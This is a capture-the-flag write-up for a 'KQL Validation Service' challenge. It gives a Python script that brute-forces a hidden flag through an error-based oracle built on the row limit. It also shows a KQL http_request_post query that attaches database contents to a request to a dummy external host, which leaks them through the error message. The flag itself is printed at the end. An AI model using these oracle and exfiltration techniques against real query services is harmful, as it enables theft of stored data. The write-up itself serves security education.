## KQL VALIDATION SERVICE

### Solution

We start with a prompt we derived to solve the previous challenge:

```kql
search * | where * contains "$$" and * contains "}"
```

After some testing, we encounter an error message that can be exploited to reveal data:

```
Query execution has exceeded the allowed limits (80DA0003): The results of this query exceed the set limit of 500 records
```

We exploit the 500-row limit and use a loop that returns more than 501 rows if it manages to find the start of the flag in the database. `pack_all` combines all columns into one, and `toscalar` converts the first row into a string (we only have one row):

```kql
range n from 1 to toscalar(search * | where * contains "ept{" | count)*501 step 1
```

The error message appeared again this time, indicating that we can find the flag in this way. This can be scripted to brute force one letter at a time:

```python
import requests
import string

def brute(url, query, word):
    for i in range(50):
        for letter in string.digits + string.ascii_lowercase + "<>,./:*@'+-$_-?!}= ":
            # Use replace placeholder with payload
            query_to_run = query.replace("$$", word+letter)

            response = requests.post(url, headers={"content-type": "application/json"}, json={ "query": query_to_run})

            if response.status_code == 400:
                word += letter
                print(word)
                if(letter == "}"): return word
                break
            else:
                print(letter)

brute("https://_uniqueid_-kqlvalidation.ept.gg/validate_kql", 'range n from 1 to toscalar(search * | where * contains "$$" and * contains "}" | count)*501 step 1', "EPT{6x+jd$")
```

This is a theoretical solution that would work for short flags. Unfortunately, the flag turned out to be too long to solve in this way. This is because an internal delay has been added to the website, forcing the page to hold for at least 3 seconds before we get a response. The theoretical time it would take to find the flag this way is:

```python
possibilities = len(string.digits + string.ascii_lowercase + "<>,./:*@'+-$_-?!}= ") # Number of characters
time_pr_try = 3 # seconds per test
avg_time_pr_char = possibilities/2 * 3
flag_len = 188 - len("ept{" + "}") # (found the flag another way later, so we know the length)
total_time = flag_len * avg_time_pr_char
```

The total time would be 15097s or 4 hours 11 minutes.

And even then, we cannot guarantee that we are correct, because the search only matches lowercase letters. If it is not accepted by CTFd, we won’t get the correct answer.

## Solution 2

Another solution (which we assume is more as intended) is to take advantage of the fact that we have plugins to send HTTP requests. We know this because it is listed under `/cluster_policies` on the website.

Here, we can either set up a server to receive the request or craft a request that fails after we find the flag, so the flag is included in the error message.

First, we extract the row that contains the flag and turn it from a table entry into a string:

```kql
toscalar(search * | where * contains "ept{" and * contains "}" | project p = pack_all())
```

Then, we insert the string as a parameter in a request we know will fail:

```kql
evaluate http_request_post(
    strcat(
        "http://dum.my?", toscalar(search * | where * contains "ept{" and * contains "}" | project pack = pack_all())
    )
)
```

As we can see, the flag is returned in an error message, meaning we never need to send the request:

![alt text](image.png)

<details>
<summary>Flag</summary>

`EPT{6X+Jd$>this_is_A_v3ry_long_fl4g_d0nt_try_to_brute_force_itt=B+----J-P.=pEv'GvAJ$aFdyRia.ABjwgv_7'j7''FY*I'JI,z@K1dvPLE@>R9!6x3O4hYG_5!/HnD/gt_g::S9'IgD'5@vbBfAcUOrv'u<4O=$,'IE./=DY$RX}`
</details>